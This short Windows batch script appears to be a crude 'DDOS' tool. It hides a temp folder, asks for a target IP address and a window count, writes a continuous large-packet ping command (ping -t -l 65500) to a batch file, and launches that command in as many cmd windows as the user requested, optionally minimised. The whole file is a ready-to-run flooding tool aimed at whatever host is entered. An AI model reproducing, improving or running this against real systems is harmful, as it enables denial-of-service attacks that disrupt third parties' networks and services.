@echo off

if exist %userprofile%\key goto skip
  cls
  echo verifiedbypass>>%userprofile%\key
  md %temp%\DDOST\
  md %userprofile%\.ddost\
  md %userprofile%\.ddost\data\
  attrib +h %temp%\DDOST\

:skip
  echo IP:
  set /p ip=
    cls
      echo Amount of windows:
  set /p windows=
    cls
      echo ping %ip% -t -l 65500>>"%temp%\DDOST\run.bat"
  choice /n /m Show Windows Y/N
    cls
      if "%errorlevel%"=="1" set mintf=/min
      if "%errorlevel%"=="2" set mintf=
      
  
for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
echo Press any button to exit
  pause >nul
    del /q "%temp%\DDOST\run.bat"
    taskkill /im /f cmd.exe
